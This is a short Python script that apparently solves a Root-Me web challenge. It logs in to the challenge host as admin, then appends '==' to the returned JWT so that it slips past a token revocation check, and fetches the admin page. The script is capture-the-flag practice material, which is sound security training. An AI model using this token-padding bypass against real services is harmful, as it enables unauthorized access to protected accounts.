import requests
import json
from flask import Flask, request, jsonify

url1 = "http://challenge01.root-me.org/web-serveur/ch63/admin"

url2 = "http://challenge01.root-me.org/web-serveur/ch63/login"


headers = {
	"Content-Type":"application/json"
}
data ={
     "username":"admin",
     "password":"admin"
}
data =json.dumps(data)


x = requests.post(url2,headers=headers,data=data)

y = json.loads(x.text)["access_token"]

headers = {
	"Authorization":"Bearer "+y+"=="
}

x = requests.get(url1,headers=headers)

print(x.text)


